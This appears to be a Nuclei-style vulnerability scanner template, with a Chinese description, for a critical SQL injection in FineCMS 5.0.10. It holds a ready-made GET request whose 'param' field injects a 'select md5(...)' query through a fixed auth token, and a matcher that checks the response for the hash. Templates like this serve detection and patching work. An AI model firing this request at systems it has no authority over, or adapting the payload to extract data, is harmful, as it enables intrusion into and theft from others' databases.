id: finecms-sqli

info:
  name: FineCMS 5.0.10 - SQL 注入漏洞
  author: ritikchaddha
  severity: critical
  description: FineCMS 5.0.10 - SQL 注入 存在SQL 注入漏洞。攻击者可借助可控参数干预后端 SQL 查询，从而读取敏感数据、绕过鉴权或进一步影响数据库完整性。
  reference:
    - https://blog.csdn.net/dfdhxb995397/article/details/101385340
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-89
  metadata:
    max-request: 1
  tags: finecms,sqli,vuln
variables:
  num: "999999999"

http:
  - method: GET
    path:
      - '{{BaseURL}}/index.php?c=api&m=data2&auth=582f27d140497a9d8f048ca085b111df&param=action=sql%20sql=%27select%20md5({{num}})%27'

    matchers:
      - type: word
        words:
          - '{{md5({{num}})}}'
